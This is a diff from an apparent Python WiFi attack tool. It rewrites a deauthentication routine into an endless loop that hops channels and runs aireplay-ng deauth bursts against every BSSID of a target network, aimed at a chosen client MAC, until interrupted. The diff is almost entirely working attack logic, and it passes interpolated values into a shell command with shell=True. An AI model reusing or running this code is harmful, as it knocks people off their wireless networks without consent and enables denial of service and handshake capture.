@@ -164,30 +164,22 @@ class Functs:
                     Functs.switch(Interface(iface), "managed", True)
                     Functs.switch(Interface(iface), "monitor", True)
                 spinner.succeed(f"{Terminal.Light_green+Terminal.Bold}Re-enabled monitor mode{Terminal.End}")
-            def ado_bssid_method(bssid_: str, channel: int):
-                Functs.ChannelSys.hopper(channel)
-                try:
-                    out = check_output(f"""aireplay-ng -0 2 -a {bssid_} -c {get_var('target_mac')} {iface}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
-                    print(out.decode())
-                    if f", but the AP uses channel" in out.decode():
-                        print(f"""=========Trying to get channel============\n{out.decode()[out.decode().find(f"AP uses channel")::]}\n===========================================""")
-                except KeyboardInterrupt:
-                    Functs.switch(Interface(iface), "managed")
-                    return "stop"
-                Functs.BSSID_METHOD.deauth(_bssid=_bssid, spinner=spinner)
 
-            for bssi, chan in _bssid.bssids.items():
-                if stopped:
-                    return
-                status = ado_bssid_method(bssi, chan)
-                if status == "stop":
-                    spinner.succeed(f"{Terminal.Light_green+Terminal.Bold+Terminal.Underline}Attack stopped.")
-                    stopped = True
-                    return "stop"
-
-            if Functs.BSSID_METHOD.deauth(_bssid=_bssid) == "stop":
-                return
-            return
+            while True:
+                for bssi, chan in _bssid.bssids.items():
+                    if stopped:
+                        return
+                    Functs.ChannelSys.hopper(chan)
+                    try:
+                        out = check_output(f"""aireplay-ng -0 2 -a {bssi} -c {get_var('target_mac')} {iface}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
+                        print(out.decode())
+                        if f", but the AP uses channel" in out.decode():
+                            print(f"""=========Trying to get channel============\n{out.decode()[out.decode().find(f"AP uses channel")::]}\n===========================================""")
+                    except KeyboardInterrupt:
+                        Functs.switch(Interface(iface), "managed")
+                        spinner.succeed(f"{Terminal.Light_green+Terminal.Bold+Terminal.Underline}Attack stopped.")
+                        stopped = True
+                        return
 
 
     class ESSID_METHOD:
